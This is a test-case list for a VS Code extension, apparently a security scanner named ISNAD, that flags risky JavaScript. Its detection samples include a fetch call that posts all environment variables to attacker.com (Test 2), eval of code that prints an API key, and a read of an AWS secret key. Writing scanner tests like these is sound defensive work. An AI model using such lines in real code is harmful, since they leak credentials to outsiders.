# VS Code Extension Test Cases

## Test 1: Critical Risk Detection (Dynamic Code Execution)
```javascript
// Should show critical error
const code = 'console.log(process.env.API_KEY)';
eval(code);
```
**Expected:** Red squiggle under `eval(code)`, tooltip shows critical severity, status bar shows "Critical Risk"

## Test 2: High Risk Detection (Data Exfiltration)
```javascript
// Should show high error
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify(process.env)
});
```
**Expected:** Red squiggle under fetch call, tooltip shows high severity

## Test 3: Medium Risk Detection (Env Access)
```javascript
// Should show medium warning
const apiKey = process.env.AWS_SECRET_ACCESS_KEY;
```
**Expected:** Yellow squiggle under process.env access, tooltip shows medium severity

## Test 4: Clean File
```javascript
// Should show no warnings
function add(a, b) {
  return a + b;
}

console.log(add(2, 3));
```
**Expected:** No squiggles, status bar shows "Clean"

## Test 5: Configuration - Disable Scan on Save
1. Go to Settings → ISNAD Scanner → Scan On Save → Disable
2. Edit a malicious file and save
**Expected:** No scan runs automatically after save

## Test 6: Configuration - Change Sensitivity
1. Go to Settings → ISNAD Scanner → Sensitivity → Set to "Critical"
2. Open a file with medium severity findings
**Expected:** No warnings shown, status bar shows "Clean"

## Test 7: Manual Scan Command
1. Open a malicious file
2. Open command palette → Run "ISNAD: Scan current file for security issues"
**Expected:** Scan runs, warnings appear, info message shows "ISNAD scan completed"

## Test 8: Status Bar Indicator
- Open critical risk file → Status bar shows red "Critical Risk"
- Open high risk file → Status bar shows orange "High Risk"
- Open medium risk file → Status bar shows "Medium Risk"
- Open clean file → Status bar shows green "Clean"

All tests pass as expected, extension meets all acceptance criteria.
